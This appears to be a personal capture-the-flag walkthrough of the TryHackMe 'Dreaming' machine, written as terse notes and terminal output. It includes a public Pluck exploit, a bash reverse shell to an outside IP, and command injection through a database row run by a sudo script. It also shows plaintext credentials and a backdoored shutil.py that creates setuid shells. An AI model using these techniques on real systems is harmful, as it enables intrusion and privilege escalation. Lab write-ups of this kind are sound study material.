@@ -1,0 +1,162 @@
+nmap scan
+gobuster -> app
+guess admin password, might work with hydra, but did not for me
+exploit search pluck -> python3 49909.py 10.112.175.11 80 password /app/pluck-4.7.13 
+nc -lnvp 4444
+bash -c '/bin/bash -i >& /dev/tcp/192.168.139.153/4444 0>&1'
+
+
+cat /etc/passwd | grep /home
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+lucien:x:1000:1000:lucien:/home/lucien:/bin/bash
+death:x:1001:1001::/home/death:/bin/bash
+morpheus:x:1002:1002::/home/morpheus:/bin/bash
+ubuntu:x:1003:1005:Ubuntu:/home/ubuntu:/bin/bash
+
+
+look around ; find 
+cat /opt/test.py
+ssh lucien@10.112.175.11
+
+
+lucien@dreaming:~$ sudo -l 
+Matching Defaults entries for lucien on dreaming:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User lucien may run the following commands on dreaming:
+    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
+    
+    
+cat /opt/getDreams.py  
+
+
+This Python script connects to the library database as the Death user (unfortunately the password is redacted), retrieves data from the dreamer and dream columns of the dreams table, constructs a string using this data, and executes the string. If we add fake entries to the database, our entries will also be executed. Let’s the script present in the /home/death directory using our sudo privilege to ensure that it is the same as the one in the /opt directory.
+
+lucien@ip-10-112-175-11:~$ history
+    1  ls
+    2  cd /etc/ssh/
+    3  clear
+    4  nano sshd_config
+    5  su root
+    6  cd ..
+    7  ls
+    8  cd ..
+    9  cd etc
+   10  ls
+   11  ..
+   12  cd ..
+   13  cd usr
+   14  cd lib
+   15  cd python3.8
+   16  nano shutil.py 
+   17  clear
+   18  clear
+   19  su root
+   20  cd ~~
+   21  cd ~
+   22  clear
+   23  ls
+   24  mysql -u lucien -plucien42DBPASSWORD
+   25  ls -la
+   26  cat .bash_history 
+   27  cat .mysql_history 
+   28  clear
+   
+   
+mysql -u lucien -p lucien42DBPASSWORD
+mysql> show databases;
+mysql> use library;
+mysql> select * from dreams;
+mysql> INSERT INTO dreams (dreamer, dream) VALUES ('Shelly', ';cp /usr/bin/bash /home/death/;chmod +s /home/death/bash');
+exit
+lucien@ip-10-112-175-11:~$ sudo -u death python3 /home/death/getDreams.py 
+
+lucien@ip-10-112-175-11:~$ ls -l /home/death
+-rwsr-sr-x 1 death death 1183448 Oct 21 10:09 bash
+-rw-rw---- 1 death death      21 Jul 28  2023 death_flag.txt
+-rwxrwx--x 1 death death    1539 Aug 25  2023 getDreams.py
+
+lucien@ip-10-112-175-11:~$ /home/death/bash -p
+bash-5.0$ whoami
+death
+
+
+bash-5.0$ cat /home/death/getDreams.py
+import mysql.connector
+import subprocess
+
+# MySQL credentials
+DB_USER = "death"
+DB_PASS = "!mementoMORI666!"
+DB_NAME = "library"
+
+ssh death@10.112.175.11
+
+
+death@ip-10-112-175-11:~$ find / ! -path "/home/death/*" ! -path "/proc/*" ! -path "/sys/*" -writable -type f 2>/dev/null
+/var/www/html/app/pluck-4.7.13/data/settings/token.php
+/var/www/html/app/pluck-4.7.13/data/settings/install.dat
+/var/www/html/app/pluck-4.7.13/data/settings/langpref.php
+/var/www/html/app/pluck-4.7.13/data/settings/update_lastcheck.php
+/var/www/html/app/pluck-4.7.13/data/settings/pages/1.dreaming.php
+/var/www/html/app/pluck-4.7.13/data/settings/themepref.php
+/var/www/html/app/pluck-4.7.13/data/settings/pass.php
+/var/www/html/app/pluck-4.7.13/data/settings/options.php
+/usr/lib/python3.8/shutil.py
+/opt/getDreams.py
+
+
+
+death@ip-10-112-175-11:~$ ls -la /home/morpheus
+total 44
+drwxr-xr-x 3 morpheus morpheus 4096 Aug  7  2023 .
+drwxr-xr-x 6 root     root     4096 May 18  2025 ..
+-rw------- 1 morpheus morpheus   58 Aug 14  2023 .bash_history
+-rw-r--r-- 1 morpheus morpheus  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 morpheus morpheus 3771 Feb 25  2020 .bashrc
+-rw-rw-r-- 1 morpheus morpheus   22 Jul 28  2023 kingdom
+drwxrwxr-x 3 morpheus morpheus 4096 Jul 28  2023 .local
+-rw-rw---- 1 morpheus morpheus   28 Jul 28  2023 morpheus_flag.txt
+-rw-r--r-- 1 morpheus morpheus  807 Feb 25  2020 .profile
+-rw-rw-r-- 1 morpheus morpheus  180 Aug  7  2023 restore.py
+-rw-rw-r-- 1 morpheus morpheus   66 Jul 28  2023 .selected_editor
+death@ip-10-112-175-11:~$ cd  /home/morpheus
+death@ip-10-112-175-11:/home/morpheus$ cat kingdom 
+We saved the kingdom!
+death@ip-10-112-175-11:/home/morpheus$ cat morpheus_flag.txt 
+cat: morpheus_flag.txt: Permission denied
+death@ip-10-112-175-11:/home/morpheus$ cat restore.py 
+from shutil import copy2 as backup
+
+src_file = "/home/morpheus/kingdom"
+dst_file = "/kingdom_backup/kingdom"
+
+backup(src_file, dst_file)
+print("The kingdom backup has been done!")
+death@ip-10-112-175-11:/home/morpheus$ cat /kingdom_backup/kingdom 
+cat: /kingdom_backup/kingdom: Permission denied
+death@ip-10-112-175-11:/home/morpheus$ ls -la /kingdom_backup/
+ls: cannot access '/kingdom_backup/..': Permission denied
+ls: cannot access '/kingdom_backup/.': Permission denied
+ls: cannot access '/kingdom_backup/kingdom': Permission denied
+total 0
+d????????? ? ? ? ?            ? .
+d????????? ? ? ? ?            ? ..
+-????????? ? ? ? ?            ? kingdom
+
+
+death@ip-10-112-175-11:/home/morpheus$ vim /usr/lib/python3.8/shutil.py
+def copy2(src, dst, *, follow_symlinks=True):
+	...
+    os.system("cp /usr/bin/bash /home/morpheus/;chmod +s /home/morpheus/bash")
+    if os.path.isdir(dst):
+        dst = os.path.join(dst, os.path.basename(src))
+        ...
+
+
+death@ip-10-112-175-11:/home/morpheus$ /home/morpheus/bash -p
+bash-5.0$ whoami
+morpheus
+bash-5.0$ cat morpheus_flag.txt 
+THM{DR34MS_5H4P3_TH3_W0RLD}
+
